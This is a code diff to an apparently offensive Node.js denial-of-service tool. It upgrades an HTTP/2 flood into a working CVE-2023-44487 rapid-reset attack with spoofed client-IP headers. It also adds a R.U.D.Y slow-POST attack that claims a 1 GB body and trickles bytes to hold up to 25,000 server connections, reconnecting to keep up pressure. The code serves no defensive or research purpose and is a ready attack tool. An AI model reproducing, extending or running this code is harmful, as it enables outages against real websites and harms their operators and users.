@@ -641,7 +641,7 @@ async function runHTTP2Flood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  const { connect: h2connect } = await import("node:http2");
+  const { connect: h2connect, constants: h2constants } = await import("node:http2");
 
   const STREAMS_PER_SESSION = Math.min(128, Math.max(16, threads * 3));
   const NUM_SESSIONS        = Math.min(threads, 40);
@@ -673,38 +673,50 @@ async function runHTTP2Flood(
     const c        = client;
     let inflight   = 0;
 
+    // ── TRUE CVE-2023-44487 RAPID RESET ─────────────────────────────────
+    // Send HEADERS frame then immediately RST_STREAM (NGHTTP2_NO_ERROR).
+    // Server MUST allocate resources for the stream before processing RST.
+    // This bypasses maxConcurrentStreams since each stream is cancelled
+    // before counted — allows millions of wasted lookups per second.
+    // h2constants is imported at the top of runHTTP2Flood
+
     const pump = () => {
       if (signal.aborted || c.destroyed) { finish(); return; }
-      while (!signal.aborted && !c.destroyed && inflight < STREAMS_PER_SESSION) {
-        inflight++;
+      // Fire a rapid burst — limited only by the H2 session window
+      for (let burst = 0; burst < 64 && !signal.aborted && !c.destroyed; burst++) {
         const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
         try {
           const stream = c.request({
-            ":method":       "GET",
-            ":path":         path,
-            ":scheme":       "https",
-            ":authority":    hostname,
-            "user-agent":    randUA(),
-            "accept":        "*/*,text/html",
-            "accept-encoding": "gzip, deflate, br",
+            ":method":         Math.random() < 0.7 ? "GET" : "POST",
+            ":path":           path,
+            ":scheme":         "https",
+            ":authority":      hostname,
+            "user-agent":      randUA(),
+            "accept":          "*/*,text/html,application/xhtml+xml",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-US,en;q=0.9",
             "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
-            "x-real-ip":     randIp(),
-            "cf-connecting-ip": randIp(),
-            "cache-control": "no-cache, no-store",
-            "pragma":        "no-cache",
-            "referer":       `https://google.com/search?q=${randStr(6)}`,
-            "x-request-id":  `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
+            "x-real-ip":       randIp(),
+            "cf-connecting-ip":randIp(),
+            "cache-control":   "no-cache, no-store, must-revalidate",
+            "pragma":          "no-cache",
+            "referer":         `https://www.google.com/search?q=${randStr(6)}`,
+            "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
+            "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
           });
-          stream.on("response", () => {
-            localPkts++;
-            localBytes += 512;
-          });
-          stream.on("data",  () => {}); // drain
-          stream.on("error", () => { inflight--; if (!signal.aborted) setImmediate(pump); });
-          stream.on("end",   () => { inflight--; if (!signal.aborted) setImmediate(pump); });
-          stream.end();
-        } catch { inflight--; break; }
+          // ★ THE RAPID RESET: Immediately send RST_STREAM after HEADERS
+          // Server was forced to look up the resource — now we cancel it.
+          stream.close(h2constants.NGHTTP2_NO_ERROR);
+          localPkts++;
+          localBytes += 400;
+          inflight++;
+          // Inflight bookkeeping — streams close near-instantly
+          stream.on("close", () => { inflight = Math.max(0, inflight - 1); });
+          stream.on("error", () => { inflight = Math.max(0, inflight - 1); });
+        } catch { break; }
       }
+      // Keep hammering at full speed
+      if (!signal.aborted && !c.destroyed) setImmediate(pump);
     };
 
     c.on("connect", () => { connected = true; pump(); });
@@ -902,10 +914,18 @@ async function runConnFlood(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
-//  HTTP EXHAUST — huge POST bodies exhaust server memory, upload bandwidth,
-//  and parser buffers. Uses http.request (not fetch) for unlimited sockets.
+//  R.U.D.Y (R-U-Dead-Yet) — TRUE SLOW POST IMPLEMENTATION
+//
+//  Sends a POST with Content-Length: 1,000,000,000 (1 GB) then trickles
+//  1-2 random bytes every 5-15 seconds. Apache/IIS/Tomcat allocate a
+//  thread or goroutine per connection and hold it until the body completes.
+//  With 30K connections open, the server's thread pool is completely
+//  exhausted within seconds — all legitimate requests are queued forever.
+//
+//  Key difference from HTTP Exhaust: we NEVER send the full body.
+//  The server waits indefinitely → threads = held → server = dead.
 // ─────────────────────────────────────────────────────────────────────────
-async function runHTTPExhaust(
+async function runRUDY(
   base: string,
   threads: number,
   signal: AbortSignal,
@@ -915,52 +935,98 @@ async function runHTTPExhaust(
     try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
     catch { return new URL("http://127.0.0.1"); }
   })();
-  const isHttps   = u.protocol === "https:";
-  const hostname  = u.hostname;
-  const tgtPort   = parseInt(u.port) || (isHttps ? 443 : 80);
+  const isHttps    = u.protocol === "https:";
+  const hostname   = u.hostname;
+  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
   const resolvedIp = await resolveHost(hostname).catch(() => hostname);
 
-  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data","/graphql","/form","/register","/api/import","/api/bulk","/api/batch","/api/v1/data","/api/v2/submit"];
-  const METHS  = ["POST","POST","POST","PUT","PATCH","POST"];
-  const MAX_INFLIGHT = Math.min(threads * 12, 2400);
-  let inflight = 0;
+  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data",
+                  "/graphql","/form","/register","/api/import","/api/bulk","/api/batch",
+                  "/api/v1/data","/api/v2/submit","/wp-login.php","/admin/login",
+                  "/api/auth/login","/contact","/api/v1/user","/api/v2/create"];
+  const MAX_CONN   = Math.min(threads * 80, 25000);
+  const FAKE_LEN   = 1_000_000_000; // Claim 1GB body — server waits forever
+
   let localPkts = 0, localBytes = 0;
-  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
-  const flushIv = setInterval(flush, 300);
+  const flush    = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv  = setInterval(flush, 300);
 
-  const doRequest = () => {
-    if (signal.aborted) return;
-    inflight++;
-    const method  = METHS[randInt(0, METHS.length)];
-    const path    = PATHS[randInt(0, PATHS.length)] + `?_=${randStr(8)}`;
-    const body    = getHeavy();
-    const bodyBuf = Buffer.from(body);
-    const h       = buildHeaders(true, bodyBuf.length);
+  // Each connection uses a raw TCP socket for precise byte-level control
+  const runConn = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
 
-    const req = (isHttps ? https : http).request({
-      hostname: resolvedIp, port: tgtPort, path, method,
-      headers: { ...h, Host: hostname, Connection: "close", "Content-Length": String(bodyBuf.length) } as Record<string, string>,
-      agent:   isHttps ? HTTPS_AGENT : HTTP_AGENT,
-      timeout: 800,
-      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
-    }, (res) => {
-      inflight--; localPkts++; localBytes += bodyBuf.length + 300;
-      res.destroy();
-    });
-    req.on("error",   () => { inflight--; localPkts++; localBytes += bodyBuf.length * 0.8 | 0; });
-    req.on("timeout", () => { req.destroy(); });
-    req.write(bodyBuf);
-    req.end();
-  };
+    const sock: net.Socket | tls.TLSSocket = isHttps
+      ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, timeout: 900_000 })
+      : net.createConnection({ host: resolvedIp, port: tgtPort });
 
-  const launcher = async () => {
-    while (!signal.aborted) {
-      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
-      else await new Promise(r => setTimeout(r, 0));
+    sock.setNoDelay(true);
+    sock.setTimeout(900_000); // 15 min — hold as long as possible
+
+    let keepIv:   NodeJS.Timeout | null = null;
+    let settled   = false;
+
+    const cleanup = (reconnect = true) => {
+      if (settled) return;
+      settled = true;
+      if (keepIv) { clearInterval(keepIv); keepIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      if (!signal.aborted && reconnect) {
+        // Reconnect immediately to maintain pressure
+        setImmediate(() => runConn().then(resolve));
+      } else { resolve(); }
+    };
+
+    const onConnected = () => {
+      const path    = PATHS[randInt(0, PATHS.length)] + `?_=${randStr(8)}`;
+      const ct      = Math.random() < 0.5 ? "application/x-www-form-urlencoded" : "application/json";
+      // Send POST headers with enormous Content-Length — body NEVER completes
+      const hdr = [
+        `POST ${path} HTTP/1.1`,
+        `Host: ${hostname}`,
+        `User-Agent: ${randUA()}`,
+        `Content-Type: ${ct}`,
+        `Content-Length: ${FAKE_LEN}`,
+        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
+        `Accept-Language: en-US,en;q=0.5`,
+        `Accept-Encoding: gzip, deflate`,
+        `X-Forwarded-For: ${randIp()}`,
+        `X-Real-IP: ${randIp()}`,
+        `Connection: keep-alive`,
+        `\r\n`,
+      ].join("\r\n");
+      sock.write(hdr);
+      localPkts++;
+      localBytes += hdr.length;
+
+      // Trickle 1-2 bytes every 5-15 seconds — holds the server thread indefinitely
+      keepIv = setInterval(() => {
+        if (signal.aborted || sock.destroyed) { cleanup(false); return; }
+        const chunk = Buffer.from([randInt(0x61, 0x7a), randInt(0x30, 0x39)]); // random letters+digits
+        const written = sock.write(chunk);
+        localPkts++;
+        localBytes += chunk.length;
+        if (!written) { cleanup(true); } // backpressure = server overloaded
+      }, randInt(5_000, 15_000));
+    };
+
+    if (isHttps) {
+      (sock as tls.TLSSocket).once("secureConnect", onConnected);
+    } else {
+      sock.once("connect", onConnected);
     }
-  };
 
-  await Promise.all(Array.from({ length: Math.min(threads, 200) }, () => launcher()));
+    sock.once("error",   () => cleanup(true));
+    sock.once("timeout", () => cleanup(true));
+    sock.once("close",   () => cleanup(true));
+
+    signal.addEventListener("abort", () => {
+      if (keepIv) { clearInterval(keepIv); keepIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      if (!settled) { settled = true; resolve(); }
+    }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: MAX_CONN }, () => runConn()));
   clearInterval(flushIv);
   flush();
 }
@@ -1028,8 +1094,8 @@ async function runWorker() {
     await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);
 
   } else if (cfg.method === "rudy") {
-    // R-U-Dead-Yet: POST with huge content-length, body trickled slowly
-    await runHTTPExhaust(base, cfg.threads, ctrl.signal, onStats);
+    // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
+    await runRUDY(base, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "http-bypass") {
     // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
